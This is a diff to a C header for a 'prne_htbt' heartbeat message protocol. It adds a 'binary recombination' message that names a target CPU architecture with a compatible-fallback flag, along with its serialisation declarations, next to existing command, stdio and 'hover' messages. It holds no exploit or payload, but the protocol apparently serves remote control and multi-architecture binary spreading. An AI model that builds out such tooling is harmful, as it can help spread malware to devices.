@@ -22,9 +22,10 @@ typedef struct prne_htbt_cmd prne_htbt_cmd_t;
 typedef struct prne_htbt_bin_meta prne_htbt_bin_meta_t;
 typedef struct prne_htbt_hover prne_htbt_hover_t;
 typedef struct prne_htbt_stdio prne_htbt_stdio_t;
+typedef struct prne_htbt_rcb prne_htbt_rcb_t;
 
 typedef enum {
-	PRNE_ARCH_NONE = -1,
+	PRNE_ARCH_NONE,
 
 	PRNE_ARCH_I686,
 	PRNE_ARCH_X86_64,
@@ -41,7 +42,7 @@ typedef enum {
 
 	NB_PRNE_ARCH
 } prne_arch_t;
-PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFF);
+PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFE);
 
 typedef enum {
 	PRNE_IPV_NONE,
@@ -174,7 +175,7 @@ typedef enum {
 	/* Binary Recombination Operation
 	* TODO
 	*
-	*	uint8_t arch
+	*	uint8_t arch	: "self" assumed if PRNE_ARCH_NONE
 	*	uint1_t compat	: allow fallback to compatible arch
 	*	uint7_t rsv
 	*/
@@ -267,6 +268,11 @@ struct prne_htbt_stdio {
 	size_t len;
 	bool err;
 	bool fin;
+};
+
+struct prne_htbt_rcb {
+	prne_arch_t arch;
+	bool compat;
 };
 
 typedef void(*prne_htbt_init_ft)(void *ptr);
@@ -398,6 +404,10 @@ bool prne_htbt_eq_stdio (
 	const prne_htbt_stdio_t *a,
 	const prne_htbt_stdio_t *b);
 
+void prne_htbt_init_rcb (prne_htbt_rcb_t *r);
+void prne_htbt_free_rcb (prne_htbt_rcb_t *r);
+bool prne_htbt_eq_rcb (const prne_htbt_rcb_t *a, const prne_htbt_rcb_t *b);
+
 prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
 	uint8_t *mem,
 	const size_t mem_len,
@@ -433,6 +443,11 @@ prne_htbt_ser_rc_t prne_htbt_ser_stdio (
 	const size_t mem_len,
 	size_t *actual,
 	const prne_htbt_stdio_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_rcb (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_rcb_t *in);
 
 prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
 	const uint8_t *data,
@@ -469,6 +484,11 @@ prne_htbt_ser_rc_t prne_htbt_dser_stdio (
 	const size_t len,
 	size_t *actual,
 	prne_htbt_stdio_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_rcb (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_rcb_t *out);
 
 char **prne_htbt_parse_args (
 	char *m_args,
